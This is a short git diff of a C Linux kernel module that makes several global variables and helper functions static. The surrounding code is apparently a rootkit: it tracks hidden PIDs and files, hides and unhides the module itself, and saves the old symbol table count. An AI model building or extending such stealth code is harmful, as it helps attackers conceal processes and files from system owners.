@@ -15,13 +15,13 @@ struct list_pids_node{
 	int pid;
 };
 
-struct list_head list_files = LIST_HEAD_INIT(list_files);
-struct list_head list_pids = LIST_HEAD_INIT(list_pids);
+static struct list_head list_files = LIST_HEAD_INIT(list_files);
+static struct list_head list_pids = LIST_HEAD_INIT(list_pids);
 
 
-int module_hidden = 0;
+static int module_hidden = 0;
 static struct list_head* prev_module;
-unsigned int num_symtab_old;
+static unsigned int num_symtab_old;
 
 int is_module_hidden(void){
     return module_hidden;
@@ -59,12 +59,12 @@ int unhide_module(void){
 }
 
 // DELETE LISTS
-void delete_pids_node(struct list_pids_node* node){
+static void delete_pids_node(struct list_pids_node* node){
     list_del(&node->list);
     kfree(node);
 }
 
-void delete_files_node(struct list_files_node* node){
+static void delete_files_node(struct list_files_node* node){
     list_del(&node->list);
     kfree(node->name);
     kfree(node);
@@ -137,7 +137,7 @@ int is_pid_hidden(int pid){
 	return 0;
 }
 
-char* my_basename(const char* pathname){
+static char* my_basename(const char* pathname){
 	// Examples: proc/ /proc proc proc/pepe /proc/
 	int len = strlen(pathname);
 	const char* basename = pathname;
